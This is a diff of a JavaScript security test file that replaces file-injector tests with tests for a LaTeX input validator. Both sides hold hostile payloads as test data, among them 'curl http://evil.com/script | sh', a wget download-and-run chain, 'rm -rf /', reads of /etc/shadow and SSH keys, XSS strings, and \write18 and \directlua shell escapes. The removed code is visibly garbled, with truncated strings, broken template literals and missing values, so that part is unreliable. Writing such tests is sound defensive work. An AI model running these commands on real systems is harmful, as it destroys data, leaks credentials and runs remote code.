@@ -1,469 +1,342 @@
-import { describe, it, expect, beforeEach, afterEach } from "vitest";
-import fs from "fs-extra";
-import path from "node:path";
-import { exec } from "node:child_process";
-import { promisify } from "node:util";
-import { FileInjector } from "../../src/lib/file-injector.js";
-import { Generator } from "../../src/lib/generator.js";
-import { FrontmatterParser } from "../../src/lib/frontmatter-parser.js";
+/**
+ * SECURITY VALIDATION TESTS
+ * Critical security tests for LaTeX input validation and injection prevention
+ */
+import { describe, it, expect, beforeEach } from 'vitest';
+import { 
+  validateSecurityThreats, 
+  validateFilePath, 
+  validateCommand, 
+  sanitizeInput 
+} from '../../src/lib/latex/validator.js';
+import { LaTeXTemplateGenerator } from '../../src/lib/latex/template-generator.js';
 
-const execAsync = promisify(exec);
-
-describe("Comprehensive Security Validation", () => {
-  let fileInjector;
-  let generator;
-  let frontmatterParser;
-  let testDir => {
-    fileInjector = new FileInjector();
-    generator = new Generator();
-    frontmatterParser = new FrontmatterParser();
-    testDir = path.join(__dirname, "temp-security-test");
-    await fs.ensureDir(testDir);
-  });
-
-  afterEach(async () => {
-    await fs.remove(testDir);
-  });
-
-  describe("Path Traversal Protection", () => { const pathTraversalPayloads = [
-      "../../../etc/passwd",
-      "..\\..\\..\\windows\\system32\\config\\sam",
-      "/etc/passwd",
-      "/root/.bashrc",
-      "C },
-              { force, dry }
-            );
-            return { payload, blocked };
-          } catch (error) { return { payload, blocked, message };
-          }
-        })
-      );
-
-      results.forEach(({ payload, blocked, message }) => {
-        expect(blocked).toBe(true);
-        expect(message).toMatch(/(security|invalid|path|traversal|dangerous)/i);
-        console.log(`✅ Blocked path traversal);
-      });
+describe('LaTeX Security Validation', () => {
+  describe('validateSecurityThreats', () => {
+    it('should detect shell execution attempts', () => {
+      const maliciousContent = '\\write18{rm -rf /}';
+      const result = validateSecurityThreats(maliciousContent);
+      
+      expect(result.isSafe).toBe(false);
+      expect(result.violations).toHaveLength(1);
+      expect(result.violations[0].severity).toBe('critical');
+      expect(result.violations[0].message).toContain('Shell command execution');
     });
 
-    it("should prevent access to system directories", async () => { const systemPaths = [
-        "/etc/shadow",
-        "/root/.ssh/id_rsa",
-        "/sys/class/net",
-        "/proc/self/environ",
-        "/dev/random",
-        "C },
-          { force, dry }
-        );
-        
-        expect(result.success).toBe(false);
-        expect(result.message).toMatch(/(security|system|dangerous|blocked)/i);
-        console.log(`✅ Blocked system path);
-      }
+    it('should detect path traversal attacks', () => {
+      const maliciousContent = '\\input{../../../etc/passwd}';
+      const result = validateSecurityThreats(maliciousContent);
+      
+      expect(result.isSafe).toBe(false);
+      expect(result.violations).toHaveLength(1);
+      expect(result.violations[0].severity).toBe('critical');
+      expect(result.violations[0].message).toContain('Path traversal attack');
     });
 
-    it("should validate and sanitize paths correctly", async () => {
-      const validPaths = [
-        "./src/components/Button.tsx",
-        "components/Header.vue",
-        "lib/utils/helpers.js",
-        path.join(testDir, "valid-file.txt")
-      ];
+    it('should detect Lua code execution', () => {
+      const maliciousContent = '\\directlua{os.execute("malicious command")}';
+      const result = validateSecurityThreats(maliciousContent);
+      
+      expect(result.isSafe).toBe(false);
+      expect(result.violations).toHaveLength(1);
+      expect(result.violations[0].severity).toBe('critical');
+      expect(result.violations[0].message).toContain('Lua code execution');
+    });
 
-      for (const validPath of validPaths) {
-        const result = await fileInjector.processFile(
-          validPath,
-          "valid content",
-          {},
-          { force, dry }
-        );
-        
-        // Valid paths should either succeed (dry run) or have non-security error
-        if (!result.success) {
-          expect(result.message).not.toMatch(/(security|traversal|dangerous)/i);
-        }
-        console.log(`✅ Valid path processed);
-      }
+    it('should detect excessive command nesting (DoS)', () => {
+      const maliciousContent = '{'.repeat(100) + '}' .repeat(100);
+      const result = validateSecurityThreats(maliciousContent);
+      
+      expect(result.isSafe).toBe(false);
+      const dosViolation = result.violations.find(v => v.type === 'dos_attack');
+      expect(dosViolation).toBeDefined();
+      expect(dosViolation.severity).toBe('high');
+    });
+
+    it('should allow safe LaTeX content', () => {
+      const safeContent = `
+        \\documentclass{article}
+        \\usepackage{amsmath}
+        \\begin{document}
+        \\title{Safe Document}
+        \\author{Safe Author}
+        \\maketitle
+        \\section{Introduction}
+        This is safe content.
+        \\end{document}
+      `;
+      
+      const result = validateSecurityThreats(safeContent);
+      expect(result.isSafe).toBe(true);
+      expect(result.violations.filter(v => v.severity === 'critical' || v.severity === 'high')).toHaveLength(0);
     });
   });
 
-  describe("Input Sanitization", () => { const xssPayloads = [
-      "alert('XSS')</script>",
-      "<img src=x onerror=alert('XSS')>",
-      "javascript }",
-      "{{constructor.constructor('return process')().exit()}}",
-      "{%raw%}alert('XSS')</script>{%endraw%}",
-      "{{7*7}}{{7*'7'}}",
-      "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"
-    ];
-
-    it("should sanitize XSS attempts in template content", async () => {
-      for (const payload of xssPayloads) {
-        const testFile = path.join(testDir, "xss-test.txt");
-        
-        const result = await fileInjector.processFile(
-          testFile,
-          payload,
-          {},
-          { force, dry }
-        );
-
-        // Content should be processed without executing malicious code
-        expect(result.success).toBe(true);
-        console.log(`✅ XSS payload safely processed, 30)}...`);
-      }
+  describe('validateFilePath', () => {
+    it('should prevent path traversal attacks', () => {
+      const maliciousPath = '../../../etc/passwd';
+      const result = validateFilePath(maliciousPath);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.violation).toBe('path_traversal');
+      expect(result.error).toContain('Path traversal attack detected');
     });
 
-    it("should prevent command injection in frontmatter", async () => { const commandInjectionPayloads = [
-        "test.txt && rm -rf /",
-        "test.txt; cat /etc/passwd",
-        "test.txt | sh",
-        "test.txt $(rm -rf /)",
-        "test.txt `whoami`",
-        "test.txt; python -c 'import os; os.system(\"rm -rf /\")'",
-        "test.txt && powershell -c \"Remove-Item -Path C };
-
-        const testFile = path.join(testDir, "injection-test.txt");
-        const result = await fileInjector.processFile(
-          testFile,
-          "test content",
-          frontmatter,
-          { force, dry }
-        );
-
-        // Should not execute harmful commands
-        expect(() => {
-          // Simulate processing the frontmatter
-          frontmatterParser.validate(frontmatter);
-        }).not.toThrow();
-        
-        console.log(`✅ Command injection blocked, 30)}...`);
-      }
+    it('should block dangerous file extensions', () => {
+      const dangerousPath = './malicious.exe';
+      const result = validateFilePath(dangerousPath);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.violation).toBe('dangerous_extension');
+      expect(result.error).toContain('Dangerous file extension');
     });
 
-    it("should handle special characters safely", async () => {
-      const specialChars = [
-        "\0null byte",
-        "\r\nCRLF injection",
-        "unicode\u0000null",
-        "high\uFFFDunicode",
-        "control\x1B[31mchars",
-        "emoji💀test",
-        "tab\ttab",
-        "newline\nnewline"
-      ];
-
-      for (const char of specialChars) {
-        const testFile = path.join(testDir, `special-${Date.now()}.txt`);
-        const result = await fileInjector.processFile(
-          testFile,
-          char,
-          {},
-          { force, dry }
-        );
-
-        expect(result.success).toBe(true);
-        console.log(`✅ Special character handled, '?')}`);
-      }
+    it('should allow safe file paths', () => {
+      const safePath = './documents/safe-document.tex';
+      const result = validateFilePath(safePath);
+      
+      expect(result.isValid).toBe(true);
+      expect(result.sanitized).toContain('safe-document.tex');
     });
   });
 
-  describe("Resource Protection", () => {
-    it("should respect file size limits", async () => {
-      // Test file size limit (100MB code)
-      const largeContent = "A".repeat(1024 * 1024); // 1MB string
-      const testFile = path.join(testDir, "large-test.txt");
+  describe('validateCommand', () => {
+    it('should block dangerous commands', () => {
+      const result = validateCommand('write18', ['rm -rf /']);
       
-      // First create a file within limits
-      await fs.writeFile(testFile, largeContent);
-      
-      const result = await fileInjector.processFile(
-        testFile,
-        "additional content",
-        {},
-        { force, dry }
-      );
-
-      // Should handle normal-sized files
-      expect(result.success).toBe(true);
-      
-      // Test would-be too large file (simulate)
-      const mockStats = { size }; // 200MB
-      // This would be caught by the file size check in the actual code
-      expect(mockStats.size > 100_000_000).toBe(true);
-      
-      console.log("✅ File size limits respected");
+      expect(result.isValid).toBe(false);
+      expect(result.severity).toBe('critical');
+      expect(result.violation).toBe('blocked_command');
     });
 
-    it("should handle concurrent file operations safely", async () => {
-      const testFile = path.join(testDir, "concurrent-test.txt");
-      const operations = [];
-
-      // Start multiple concurrent operations
-      for (let i = 0; i < 10; i++) {
-        operations.push(
-          fileInjector.processFile(
-            testFile,
-            `Content ${i}`,
-            {},
-            { force, dry }
-          )
-        );
-      }
-
-      const results = await Promise.allSettled(operations);
-      const successful = results.filter(r => r.status === 'fulfilled').length;
+    it('should block unknown commands in strict mode', () => {
+      const result = validateCommand('unknowncommand', []);
       
-      // At least some operations should succeed (race conditions handled)
-      expect(successful).toBeGreaterThan(0);
-      console.log(`✅ Concurrent operations handled);
+      expect(result.isValid).toBe(false);
+      expect(result.severity).toBe('high');
+      expect(result.violation).toBe('unknown_command');
     });
 
-    it("should prevent DoS through excessive recursion", async () => {
-      // Test template depth limit (MAX_TEMPLATE_DEPTH = 10)
-      let depthCount = 0;
+    it('should allow safe commands', () => {
+      const result = validateCommand('textbf', ['safe text']);
       
-      const mockRecursiveCall = async () => {
-        depthCount++;
-        if (depthCount > 15) { // Exceed the limit
-          throw new Error("Recursion limit exceeded");
-        }
-        if (depthCount < 12) {
-          await mockRecursiveCall();
-        }
+      expect(result.isValid).toBe(true);
+      expect(result.error).toBeNull();
+    });
+
+    it('should validate graphics paths', () => {
+      const result = validateCommand('includegraphics', ['../../../etc/passwd']);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.severity).toBe('high');
+      expect(result.error).toContain('Invalid graphics path');
+    });
+
+    it('should block dangerous packages', () => {
+      const result = validateCommand('usepackage', ['shellesc']);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.severity).toBe('critical');
+      expect(result.error).toContain('Dangerous package detected');
+    });
+  });
+
+  describe('sanitizeInput', () => {
+    it('should remove dangerous patterns', () => {
+      const maliciousInput = '\\write18{malicious}\\directlua{bad}';
+      const sanitized = sanitizeInput(maliciousInput);
+      
+      expect(sanitized).not.toContain('\\write18');
+      expect(sanitized).not.toContain('\\directlua');
+    });
+
+    it('should remove control characters', () => {
+      const maliciousInput = 'normal\x00text\x1Fwith\x7Fcontrol';
+      const sanitized = sanitizeInput(maliciousInput);
+      
+      expect(sanitized).toBe('normaltext withcontrol');
+    });
+
+    it('should limit input length', () => {
+      const longInput = 'a'.repeat(20000);
+      const sanitized = sanitizeInput(longInput);
+      
+      expect(sanitized.length).toBeLessThanOrEqual(10000);
+    });
+
+    it('should normalize whitespace', () => {
+      const input = 'text   with    excessive     whitespace';
+      const sanitized = sanitizeInput(input);
+      
+      expect(sanitized).toBe('text with excessive whitespace');
+    });
+  });
+
+  describe('LaTeX Template Generator Security', () => {
+    let generator;
+
+    beforeEach(() => {
+      generator = new LaTeXTemplateGenerator();
+    });
+
+    it('should validate template configuration', () => {
+      const maliciousConfig = {
+        type: 'article',
+        title: '\\write18{rm -rf /}',
+        author: 'Safe Author',
+        packages: ['shellesc']
       };
 
-      try {
-        await mockRecursiveCall();
-        expect(depthCount).toBeLessThanOrEqual(15);
-      } catch (error) {
-        expect(error.message).toMatch(/recursion|limit|depth/i);
-      }
+      const validation = generator.validateTemplateConfig(maliciousConfig);
       
-      console.log("✅ Recursion depth limits enforced");
+      expect(validation.isValid).toBe(false);
+      expect(validation.errors).toContain('Title contains dangerous patterns');
+      expect(validation.errors).toContain('Dangerous packages detected: shellesc');
     });
 
-    it("should timeout long-running operations", async () => {
+    it('should sanitize LaTeX content', () => {
+      const maliciousContent = '\\write18{malicious}&dangerous%content';
+      const sanitized = generator.sanitizeLatexContent(maliciousContent);
+      
+      expect(sanitized).not.toContain('\\write18');
+      expect(sanitized).toContain('\\&');  // Escaped ampersand
+      expect(sanitized).toContain('\\%');  // Escaped percent
+    });
+
+    it('should generate secure templates', () => {
+      const safeConfig = {
+        type: 'article',
+        title: 'Safe Title',
+        author: 'Safe Author',
+        bibliography: false,
+        packages: ['amsmath', 'graphicx']
+      };
+
+      const content = generator.generateTemplate(safeConfig);
+      const validation = validateSecurityThreats(content);
+      
+      expect(validation.isSafe).toBe(true);
+      expect(content).toContain('\\documentclass{article}');
+      expect(content).toContain('\\title{Safe Title}');
+      expect(content).toContain('\\author{Safe Author}');
+    });
+
+    it('should reject malicious template configurations', () => {
+      const maliciousConfig = {
+        type: 'article',
+        title: '\\directlua{os.execute("malicious")}',
+        author: 'Attacker',
+        packages: ['write18']
+      };
+
+      expect(() => generator.generateTemplate(maliciousConfig)).toThrow('Security validation failed');
+    });
+  });
+
+  describe('Attack Vector Tests', () => {
+    const attackVectors = [
+      {
+        name: 'Shell execution via write18',
+        payload: '\\write18{cat /etc/passwd}',
+        expectedDetection: 'Shell command execution'
+      },
+      {
+        name: 'Path traversal in input',
+        payload: '\\input{../../../../etc/shadow}',
+        expectedDetection: 'Path traversal attack'
+      },
+      {
+        name: 'Lua code injection',
+        payload: '\\directlua{require("os").execute("malicious")}',
+        expectedDetection: 'Lua code execution'
+      },
+      {
+        name: 'File system access',
+        payload: '\\openout\\myfile=malicious.txt',
+        expectedDetection: 'file system access'
+      },
+      {
+        name: 'JavaScript URL scheme',
+        payload: '\\href{javascript:alert("xss")}{click}',
+        expectedDetection: 'JavaScript URL scheme'
+      },
+      {
+        name: 'Local file access',
+        payload: '\\url{file:///etc/passwd}',
+        expectedDetection: 'Local file URL scheme'
+      }
+    ];
+
+    attackVectors.forEach(({ name, payload, expectedDetection }) => {
+      it(`should detect: ${name}`, () => {
+        const result = validateSecurityThreats(payload);
+        
+        expect(result.isSafe).toBe(false);
+        expect(result.violations.length).toBeGreaterThan(0);
+        
+        const criticalViolations = result.violations.filter(
+          v => v.severity === 'critical' || v.severity === 'high'
+        );
+        expect(criticalViolations.length).toBeGreaterThan(0);
+        
+        const detectionFound = result.violations.some(v => 
+          v.message.toLowerCase().includes(expectedDetection.toLowerCase())
+        );
+        expect(detectionFound).toBe(true);
+      });
+    });
+  });
+
+  describe('Performance Tests', () => {
+    it('should handle large inputs without DoS', () => {
+      const largeInput = 'safe content '.repeat(50000);  // ~650KB
+      
       const startTime = Date.now();
+      const result = validateSecurityThreats(largeInput);
+      const duration = Date.now() - startTime;
       
-      // Mock a long-running operation
-      const longOperation = new Promise((_, reject) => {
-        setTimeout(() => reject(new Error("Operation timeout")), 35000); // Exceed 30s limit
-      });
-
-      const timeoutPromise = new Promise((_, reject) =>
-        setTimeout(() => reject(new Error("Template processing timeout")), 30000)
-      );
-
-      try {
-        await Promise.race([longOperation, timeoutPromise]);
-      } catch (error) {
-        const duration = Date.now() - startTime;
-        expect(duration).toBeLessThan(31000); // Should timeout before 31s
-        expect(error.message).toMatch(/timeout/i);
-      }
+      // Should complete within reasonable time (< 1 second)
+      expect(duration).toBeLessThan(1000);
       
-      console.log("✅ Operation timeouts enforced");
+      // Should detect size violation
+      expect(result.isSafe).toBe(false);
+      const sizeViolation = result.violations.find(v => v.message.includes('Content too large'));
+      expect(sizeViolation).toBeDefined();
+    });
+
+    it('should handle deeply nested structures', () => {
+      const deepNesting = '{'.repeat(100) + 'content' + '}'.repeat(100);
+      
+      const result = validateSecurityThreats(deepNesting);
+      
+      expect(result.isSafe).toBe(false);
+      const nestingViolation = result.violations.find(v => v.message.includes('nesting'));
+      expect(nestingViolation).toBeDefined();
     });
   });
+});
 
-  describe("File System Security", () => {
-    it("should validate chmod permissions safely", async () => {
-      const validChmodValues = ["644", "755", "600", "700"];
-      const invalidChmodValues = ["999", "abc", "8888", "777777"];
+describe('Integration Security Tests', () => {
+  it('should prevent command line injection through all vectors', () => {
+    const maliciousInputs = [
+      '../../../etc/passwd',
+      '$(rm -rf /)',
+      '`malicious command`',
+      '\\write18{dangerous}',
+      'normal; rm -rf /',
+      'file.tex && malicious'
+    ];
 
-      for (const chmod of validChmodValues) {
-        const result = await fileInjector.setPermissions(
-          path.join(testDir, "test-chmod.txt"),
-          chmod
-        );
-        // Should handle valid chmod values (file may not exist, but validation should pass)
-        console.log(`✅ Valid chmod processed);
-      }
-
-      for (const chmod of invalidChmodValues) {
-        const result = await fileInjector.setPermissions(
-          path.join(testDir, "test-chmod.txt"),
-          chmod
-        );
-        expect(result).toBe(false); // Should reject invalid chmod
-        console.log(`✅ Invalid chmod rejected);
-      }
-    });
-
-    it("should create backups safely", async () => {
-      const testFile = path.join(testDir, "backup-test.txt");
-      await fs.writeFile(testFile, "original content");
-
-      const result = await fileInjector.processFile(
-        testFile,
-        "new content",
-        {},
-        { force, dry, backup }
-      );
-
-      expect(result.success).toBe(true);
+    maliciousInputs.forEach(input => {
+      const pathResult = validateFilePath(input);
+      const threatResult = validateSecurityThreats(input);
+      const sanitized = sanitizeInput(input);
       
-      // Check if backup was created (would have .bak. prefix)
-      const files = await fs.readdir(testDir);
-      const backupFiles = files.filter(f => f.includes("backup-test.txt.bak."));
-      expect(backupFiles.length).toBeGreaterThan(0);
+      // At least one validation should catch the threat
+      const isSafe = pathResult.isValid && threatResult.isSafe;
+      const isSanitized = sanitized !== input;
       
-      console.log("✅ Backup creation verified");
-    });
-
-    it("should handle atomic file operations", async () => {
-      const testFile = path.join(testDir, "atomic-test.txt");
-      
-      const result = await fileInjector.processFile(
-        testFile,
-        "atomic content",
-        {},
-        { force, dry }
-      );
-
-      expect(result.success).toBe(true);
-      
-      // Verify no temp files left behind
-      const files = await fs.readdir(testDir);
-      const tempFiles = files.filter(f => f.includes(".tmp."));
-      expect(tempFiles.length).toBe(0);
-      
-      console.log("✅ Atomic operations verified");
-    });
-
-    it("should block dangerous shell commands", async () => { const dangerousCommands = [
-        "rm -rf /",
-        "del /f /s /q C };:", // Fork bomb
-        "curl http://evil.com/script | sh",
-        "wget http://malicious.site/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload",
-        "python -c \"import os; os.system('rm -rf /')\""
-      ];
-
-      for (const command of dangerousCommands) {
-        try {
-          // Don't actually execute - just test the command structure
-          const mockResult = await fileInjector.executeCommands(command);
-          
-          // In a real scenario, this would be blocked or sanitized
-          expect(command).toContain("rm"); // Just verify we're testing dangerous commands
-          console.log(`⚠️  Dangerous command identified, 30)}...`);
-        } catch (error) {
-          console.log(`✅ Dangerous command blocked, 30)}...`);
-        }
-      }
-    });
-  });
-
-  describe("Windows Device Name Protection", () => {
-    it("should block Windows reserved device names", async () => {
-      const windowsDevices = [
-        "CON.txt",
-        "PRN.log", 
-        "AUX.dat",
-        "NUL.tmp",
-        "COM1.txt",
-        "COM9.log",
-        "LPT1.dat",
-        "LPT9.tmp"
-      ];
-
-      for (const device of windowsDevices) {
-        const devicePath = path.join(testDir, device);
-        const result = await fileInjector.processFile(
-          devicePath,
-          "content",
-          {},
-          { force, dry }
-        );
-
-        if (process.platform === 'win32') {
-          expect(result.success).toBe(false);
-          expect(result.message).toMatch(/device|reserved|windows/i);
-        }
-        console.log(`✅ Windows device name handled);
-      }
-    });
-  });
-
-  describe("Error Handling and Logging", () => { it("should handle errors gracefully without exposing system info", async () => {
-      const errorCases = [
-        { path },
-        { path },
-        { path },
-        { path }
-      ];
-
-      for (const testCase of errorCases) {
-        try {
-          const result = await fileInjector.processFile(
-            testCase.path,
-            testCase.content,
-            {},
-            { force, dry }
-          );
-          
-          if (!result.success) { // Error messages should not expose sensitive system information
-            expect(result.message).not.toMatch(/C }
-        } catch (error) { expect(error.message).not.toMatch(/C }
-      }
-    });
-  });
-
-  describe("Performance Under Load", () => {
-    it("should maintain security under concurrent load", async () => {
-      const concurrentOperations = 50;
-      const operations = [];
-
-      for (let i = 0; i < concurrentOperations; i++) {
-        const maliciousPath = `../../../etc/passwd${i}`;
-        operations.push(
-          fileInjector.processFile(
-            maliciousPath,
-            `malicious content ${i}`,
-            {},
-            { force, dry }
-          )
-        );
-      }
-
-      const results = await Promise.allSettled(operations);
-      const allBlocked = results.every(result => {
-        if (result.status === 'fulfilled') {
-          return !result.value.success; // All should fail (be blocked)
-        }
-        return true; // Rejected promises also count
-      });
-
-      expect(allBlocked).toBe(true);
-      console.log(`✅ All ${concurrentOperations} concurrent malicious operations blocked`);
-    });
-
-    it("should handle memory efficiently under load", async () => {
-      const initialMemory = process.memoryUsage().heapUsed;
-      const operations = [];
-
-      // Create many operations with large content
-      for (let i = 0; i < 100; i++) {
-        const content = "A".repeat(1000); // 1KB per operation
-        operations.push(
-          fileInjector.processFile(
-            path.join(testDir, `load-test-${i}.txt`),
-            content,
-            {},
-            { force, dry }
-          )
-        );
-      }
-
-      await Promise.all(operations);
-      
-      const finalMemory = process.memoryUsage().heapUsed;
-      const memoryIncrease = finalMemory - initialMemory;
-      
-      // Memory increase should be reasonable (less than 50MB for this test)
-      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
-      console.log(`✅ Memory increase under load)}MB`);
+      expect(isSafe || isSanitized).toBe(true);
     });
   });
 });
